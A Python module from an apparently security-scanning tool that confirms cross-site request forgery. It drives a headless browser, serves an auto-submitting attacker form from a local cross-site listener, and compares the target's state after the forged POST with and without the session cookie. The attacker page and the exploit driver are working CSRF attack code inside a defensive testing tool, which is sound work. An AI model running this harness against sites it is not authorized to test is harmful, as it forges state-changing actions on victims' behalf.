"""
scanner.csrf_achieved — CSRF ACHIEVED, confirmed by a REAL SameSite-honoring headless browser that
actually attaches the ambient session cookie to a cross-SITE state-changing request (Wave-3.3,
gated-workflow, browser-backed).

Cross-site request forgery (CWE-352) is an authorization bug: a state-changing request a victim's
browser issues cross-site is honored because it rides the victim's ambient session cookie, and the app
neither validates a synchronizer token nor an Origin, nor scopes the cookie with SameSite. The posture
oracle (``verify.oracles.csrf_posture_oracle``) finds a *lead / posture-FACT*: a state-changing request
accepted 2xx with a valid token AND accepted 2xx with the token stripped proves the token is unenforced
— but it says NOTHING about whether a cross-site attack actually succeeds. Whether the victim's browser
would SEND the cookie cross-site (SameSite) is a browser behaviour a server cannot fake and a
hand-crafted HTTP client (urllib) cannot honestly assert: urllib attaches whatever ``Cookie`` header you
give it regardless of SameSite, so a urllib "re-drive" against a target defended by ``SameSite=Strict``
ALONE — impossible to CSRF in a real browser — would falsely report success. That is exactly the false
FACT this module refuses to mint.

This module proves the achieved exploit the only sound way — by DRIVING A REAL HEADLESS BROWSER and
OBSERVING what it does:

  1. establish VIGIL's OWN authenticated session by navigating the browser to the target's login
     endpoint, so the SERVER sets the ambient session cookie WITH its own ``SameSite`` attribute (the
     browser then honours it exactly as a victim's browser would);
  2. stand up VIGIL's OWN attacker page on a GENUINELY DIFFERENT SITE (a fresh loopback listener
     addressed by a cross-site host — ``localhost`` vs ``127.0.0.1`` — so the browser sees a real
     cross-site initiator, not merely a different port), which auto-submits a top-level form POST
     carrying a UNIQUE per-probe ``marker`` to the target's state-changing endpoint;
  3. OBSERVE via CDP (``Network.requestWillBeSentExtraInfo``) whether the SameSite-honoring browser
     ACTUALLY attached the ambient session cookie to that cross-site request — a ``Lax``/``Strict``
     cookie carries a ``SameSite*`` blocked reason and is NOT sent, so no state change is reached;
  4. read back the AUTHORITATIVE post-state (an independent, non-destructive GET of the resource state —
     NEVER the attacker's echo) both after a NO-COOKIE control (issued FIRST, before login, so the
     browser holds no ambient cookie) and after the ambient-cookie treatment;
  5. build the ``csrf_achieved`` context from the RETAINED browser evidence — the observed initiator
     ``Origin``, the observed ``associated_cookies`` + ``Cookie`` header, the observed request body
     fields / header names, and the two readbacks. The oracle (``verify.oracles.csrf_achieved_oracle``,
     ``OracleKind.ACHIEVED_STATE``, conf 0.9) DERIVES cross_origin and ambient_only FROM this evidence —
     it NEVER trusts a bare bool — and fires ONLY when a genuinely cross-site browser attached the
     ambient cookie (no SameSite block), carried no anti-CSRF token, reached the marker in the
     with-cookie readback, and did NOT reach it in the no-cookie control.

This DISSOLVES the SameSite objection: against a target defended by ``SameSite=Strict``/``Lax`` alone the
browser refuses to attach the cookie cross-site, so the treatment produces no state change AND the
observed ``associated_cookies`` shows a ``SameSite*`` block — the oracle correctly does NOT fire. An
enforced anti-CSRF token rejects the token-less write. An endpoint that accepts the write with NO cookie
at all (merely unauthenticated, not CSRF) leaves the marker in the control readback and does not fire.

Capability (honest): this mints an achieved-CSRF FACT ONLY when a usable headless Chromium is present
(``scanner.browser.browser_usable`` / ``scanner.cdp.cdp_available``). Without one the caller skips and the
class stays a rigorous LEAD / the weaker ``csrf`` posture-FACT — never a false CLEAN and never the naive
token-absence false-positive. The browser drive covers a TOP-LEVEL form POST (the classic CSRF vector);
PUT/PATCH/DELETE forgery (which a browser cannot issue cross-site without a CORS misconfiguration) stays a
LEAD. The state-changing write is a GATED-WORKFLOW precondition: in a governed engagement it routes
through the 0.3 owner-signed per-action approval (an UNENFORCED precondition at this producer layer — the
offense side stays keyless — asserted by the runner, not guaranteed here). Absent a VIGIL-owned session or
an observable post-state the claim stays a LEAD/INCONCLUSIVE.
"""

from __future__ import annotations

import http.server
import json
import secrets
import threading
from dataclasses import dataclass
from typing import Mapping, Optional
from urllib.parse import parse_qsl, urlencode, urlsplit

from ..verify.adapter import FindingContext
from ..verify.oracles import csrf_achieved_oracle
from .cdp import CdpBrowser, CdpError

# The classic CSRF vector is a TOP-LEVEL auto-submitting form POST: it is first-party at the destination
# (so browser third-party-cookie blocking does not apply) yet SameSite still evaluates it cross-site
# (the initiator is the attacker page), which is precisely the browser behaviour we must observe.
_ATTACKER_HARNESS = """<!doctype html><html><head><meta charset=utf-8></head><body>
<form id=f method=POST></form>
<script>
(function(){
  var p = new URLSearchParams(location.search);
  var f = document.getElementById('f');
  f.action = p.get('action') || '';
  var fields = {};
  try { fields = JSON.parse(p.get('fields') || '{}'); } catch (e) {}
  Object.keys(fields).forEach(function(k){
    var i = document.createElement('input'); i.type = 'hidden'; i.name = k; i.value = fields[k];
    f.appendChild(i);
  });
  f.submit();
})();
</script></body></html>"""


class _AttackerServer:
    """An ephemeral loopback HTTP server serving VIGIL's own attacker page — the auto-submit CSRF form.
    It binds to ``127.0.0.1`` but is ADVERTISED by a cross-site host (``localhost`` when the target is
    ``127.0.0.1`` and vice-versa), so the browser's origin for this page is a GENUINELY DIFFERENT SITE
    than the target's (different registrable site, not merely a different port) — which is what makes the
    form POST a cross-site request the browser evaluates against SameSite."""

    def __init__(self, *, advertise_host: str) -> None:
        harness = _ATTACKER_HARNESS.encode("utf-8")

        class _H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *_a):  # noqa: ANN002 — silence the stdlib access log
                return

            def do_GET(self):  # noqa: N802 (stdlib naming)
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(harness)))
                self.end_headers()
                self.wfile.write(harness)

        self._server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _H)
        self._server.daemon_threads = True
        self._advertise_host = advertise_host
        self._port = int(self._server.server_address[1])
        self._thread = threading.Thread(target=self._server.serve_forever, name="csrf-attacker", daemon=True)

    def __enter__(self) -> "_AttackerServer":
        self._thread.start()
        return self

    def __exit__(self, *_exc) -> None:
        try:
            self._server.shutdown()
        finally:
            self._server.server_close()

    @property
    def origin(self) -> str:
        return f"http://{self._advertise_host}:{self._port}"

    def probe_url(self, action_url: str, fields: dict) -> str:
        q = urlencode({"action": action_url, "fields": json.dumps(fields, separators=(",", ":"))})
        return f"{self.origin}/?{q}"


def _cross_site_host(target_host: str) -> str:
    """A loopback host that is a DIFFERENT registrable site than ``target_host`` (``127.0.0.1`` <->
    ``localhost``; any other target defaults to ``127.0.0.1`` — loopback is a distinct site from a remote
    host). Both loopback names resolve to the same listener, so the attacker page is reachable while the
    browser still sees a genuinely cross-site origin."""
    h = (target_host or "").strip().lower()
    if h in ("localhost", "::1", "[::1]"):
        return "127.0.0.1"
    return "localhost"


def _origin_of(url: str) -> str:
    parts = urlsplit(url)
    host = parts.hostname or ""
    port = f":{parts.port}" if parts.port is not None else ""
    return f"{parts.scheme}://{host}{port}"


@dataclass(frozen=True)
class CsrfAchievedResult:
    """One browser-backed CSRF-achieved re-drive against a state-changing endpoint."""
    method: str
    endpoint: str
    marker: str
    target_origin: str
    initiator_origin: str
    with_cookie_state: str
    no_cookie_state: str
    ambient_cookie_attached: bool
    cross_site: bool
    channel_established: bool
    achieved: bool
    context: FindingContext


def _mint_marker() -> str:
    # A VIGIL-chosen unique per-probe token; the oracle floors the length at 8, this gives 32 hex.
    return "VIGIL-CSRF-" + secrets.token_hex(16)


def _read_state(sess, read_url: str, settle: float) -> str:
    """Navigate to the authoritative post-state readback (a same-site GET) and return its rendered text."""
    try:
        sess.navigate(read_url, settle=max(0.3, settle * 0.4))
        text = sess.evaluate("document.body ? document.body.innerText : ''")
    except CdpError:
        return ""
    return text if isinstance(text, str) else ("" if text is None else str(text))


def _extract_write_evidence(sess, write_url: str) -> dict:
    """Pull the OBSERVED evidence for the cross-site write from the CDP network events buffered after the
    treatment navigation: the browser-attested initiator ``Origin``, the observed ``associated_cookies``
    (+ SameSite ``blockedReasons``), the observed ``Cookie`` header, and the request body-field / header
    names. Returns ``{}`` when the request was not observed (⇒ no evidence ⇒ the oracle cannot fire)."""
    want = write_url.rstrip("/")
    request_id = None
    headers: dict = {}
    post_data = ""
    for e in sess.events_of("Network.requestWillBeSent"):
        params = e.get("params", {}) or {}
        req = params.get("request", {}) or {}
        url = (req.get("url") or "").split("#", 1)[0].split("?", 1)[0].rstrip("/")
        if url == want and (req.get("method") or "").upper() == "POST":
            request_id = params.get("requestId")
            headers = req.get("headers", {}) or {}
            post_data = req.get("postData") or ""
            break
    if request_id is None:
        return {}
    associated: list[dict] = []
    cookie_header = ""
    for e in sess.events_of("Network.requestWillBeSentExtraInfo"):
        params = e.get("params", {}) or {}
        if params.get("requestId") != request_id:
            continue
        for c in params.get("associatedCookies", []) or []:
            cookie = c.get("cookie", {}) or {}
            associated.append({
                "name": cookie.get("name", ""),
                "blocked_reasons": list(c.get("blockedReasons", []) or []),
            })
        extra_headers = params.get("headers", {}) or {}
        cookie_header = extra_headers.get("Cookie") or extra_headers.get("cookie") or cookie_header
        break
    # The initiator origin the BROWSER attested on the cross-site write (why a cross-origin POST carries
    # an Origin header at all). Falls back to the request-headers Cookie-less view if absent.
    initiator_origin = headers.get("Origin") or headers.get("origin") or ""
    body_fields = [k for k, _v in parse_qsl(post_data, keep_blank_values=True)] if post_data else []
    return {
        "initiator_origin": initiator_origin,
        "associated_cookies": associated,
        "observed_cookie_header": cookie_header,
        "observed_request_fields": body_fields,
        "observed_request_header_names": [str(k).lower() for k in headers.keys()],
    }


def confirm_csrf_achieved(
    *,
    target_base: str,
    login_path: str,
    write_path: str,
    read_path: str,
    ambient_cookie_name: str,
    method: str = "POST",
    extra_form_fields: Optional[Mapping[str, str]] = None,
    marker: Optional[str] = None,
    browser: Optional[CdpBrowser] = None,
    attacker_host: Optional[str] = None,
    settle: float = 1.2,
) -> CsrfAchievedResult:
    """Drive the achieved-CSRF exploit against ``target_base`` with a REAL headless browser and return a
    :class:`CsrfAchievedResult`.

    Sequence: (1) NO-COOKIE control — from VIGIL's own attacker page on a genuinely different site, before
    login, auto-submit a top-level form POST of the unique ``marker`` to ``write_path`` (the browser holds
    no ambient cookie), then read the authoritative post-state; (2) LOGIN — navigate to ``login_path`` so
    the SERVER sets the ambient session cookie with its own SameSite attribute; (3) TREATMENT — repeat the
    SAME cross-site form POST (the browser now attaches the ambient cookie iff SameSite permits), observe
    the request via CDP, then read the post-state.

    ``result.achieved`` (and the ``csrf_achieved`` oracle over ``result.context``) is True ONLY when the
    SameSite-honoring browser ACTUALLY attached the ambient cookie to the genuinely cross-site write (CDP
    ``associated_cookies`` with no SameSite block), no anti-CSRF token rode along, and the marker reached
    the with-cookie readback but NOT the no-cookie control. A ``SameSite=Strict``/``Lax`` target => the
    browser drops the cookie => NO fire. A shared ``browser`` may be passed to amortise launch cost;
    otherwise one is started and torn down here.

    ``method`` must be ``POST`` (the classic browser CSRF vector; a form cannot issue PUT/PATCH/DELETE
    cross-site). Raises :class:`CdpError` only if no browser is available — the caller then skips the
    dynamic path (a browserless run yields a LEAD, never a false CLEAN)."""
    method_u = (method or "").strip().upper()
    if method_u != "POST":
        raise ValueError("confirm_csrf_achieved drives a top-level form POST; method must be 'POST' "
                         "(PUT/PATCH/DELETE cross-site forgery is not browser-issuable and stays a LEAD)")
    marker = marker or _mint_marker()
    base = target_base.rstrip("/")
    target_origin = _origin_of(base)
    target_host = urlsplit(base).hostname or ""
    write_url = base + write_path
    read_url = base + read_path
    login_url = base + login_path
    a_host = attacker_host or _cross_site_host(target_host)

    own = browser is None
    br = browser or CdpBrowser().start()
    evidence: dict = {}
    no_cookie_state = ""
    with_cookie_state = ""
    channel = True
    try:
        with _AttackerServer(advertise_host=a_host) as attacker:
            sess = br.session()
            try:
                sess.send("Network.enable")
                sess.send("Network.clearBrowserCookies")
            except CdpError:
                channel = False

            control_fields = dict(extra_form_fields or {})
            control_fields["marker"] = marker
            # CONTROL FIRST: the identical cross-site form POST, before login ⇒ no ambient cookie held.
            try:
                sess.navigate(attacker.probe_url(write_url, control_fields), settle=settle)
                sess.drain_events(timeout=max(0.6, settle))
            except CdpError:
                channel = False
            no_cookie_state = _read_state(sess, read_url, settle)

            # LOGIN: the server sets the ambient session cookie WITH its own SameSite attribute.
            try:
                sess.navigate(login_url, settle=max(0.3, settle * 0.4))
            except CdpError:
                channel = False

            treat_fields = dict(extra_form_fields or {})
            treat_fields["marker"] = marker
            # TREATMENT: the SAME cross-site form POST — the browser now attaches the ambient cookie iff
            # SameSite permits. Observe the request headers / associated cookies via CDP.
            try:
                sess.navigate(attacker.probe_url(write_url, treat_fields), settle=settle)
                sess.drain_events(timeout=max(0.6, settle))
                evidence = _extract_write_evidence(sess, write_url)
            except CdpError:
                channel = False
            with_cookie_state = _read_state(sess, read_url, settle)
    finally:
        if own:
            br.stop()

    ctx = FindingContext.from_csrf_achieved(
        method=method_u,
        endpoint=write_path,
        marker=marker,
        with_cookie_state=with_cookie_state,
        no_cookie_state=no_cookie_state,
        target_origin=target_origin,
        initiator_origin=evidence.get("initiator_origin", ""),
        ambient_cookie_name=ambient_cookie_name,
        associated_cookies=evidence.get("associated_cookies", []),
        observed_cookie_header=evidence.get("observed_cookie_header", ""),
        observed_request_fields=evidence.get("observed_request_fields", []),
        observed_request_header_names=evidence.get("observed_request_header_names", []),
    )
    # The producer's `achieved` flag is the oracle's own verdict over the retained evidence — single
    # source of truth, so a producer that observed a SameSite-blocked cookie can never report success.
    achieved = bool(csrf_achieved_oracle(ctx.csrf_achieved).fired)
    ambient_attached = any(
        c.get("name") == ambient_cookie_name and not c.get("blocked_reasons")
        for c in evidence.get("associated_cookies", [])
    )
    return CsrfAchievedResult(
        method=method_u,
        endpoint=write_path,
        marker=marker,
        target_origin=target_origin,
        initiator_origin=evidence.get("initiator_origin", ""),
        with_cookie_state=with_cookie_state,
        no_cookie_state=no_cookie_state,
        ambient_cookie_attached=ambient_attached,
        cross_site=_origin_of(evidence.get("initiator_origin", "") or "") != target_origin and bool(evidence.get("initiator_origin")),
        channel_established=channel,
        achieved=achieved,
        context=ctx,
    )


def csrf_achieved_finding(result: CsrfAchievedResult, *, check_id: str = "") -> dict:
    """Build the finding dict (carrying the retained ``oracle_context``) for a CSRF-achieved result, ready
    for the STD-WIRING admission choke (``verdict.admit("csrf_achieved.achieved_state", ...)`` →
    ``oracle_adapter.certify_admitted(provenance="live_redrive")``).

    The ``oracle_context`` is the pure, re-verifiable bundle the ``csrf_achieved`` oracle re-fires over
    offline; ``framework.v2 verify`` re-runs it and ``reverify.matches_claim`` rejects any tamper (a
    mutated initiator origin, a forged associated-cookie block, or a mutated readback no longer yields the
    achieved cross-site state change)."""
    return {
        "check_id": check_id or f"csrf_achieved:{result.method}:{result.endpoint}",
        "bug_class": "csrf_achieved",
        "title": "CSRF achieved (cross-site state change reached with only the ambient session cookie)",
        "severity": "High",
        "surface": f"{result.method} {result.endpoint}",
        "summary": (
            "a top-level form POST issued from a genuinely different-site attacker page carried only the "
            "ambient session cookie (the SameSite-honoring browser attached it cross-site) and reached an "
            "authoritative post-state change (a unique per-probe marker) that the no-cookie control did "
            "not — the write was authorized solely by the cookie riding cross-site"
        ),
        "oracle_context": result.context.to_verifier_context(),
    }
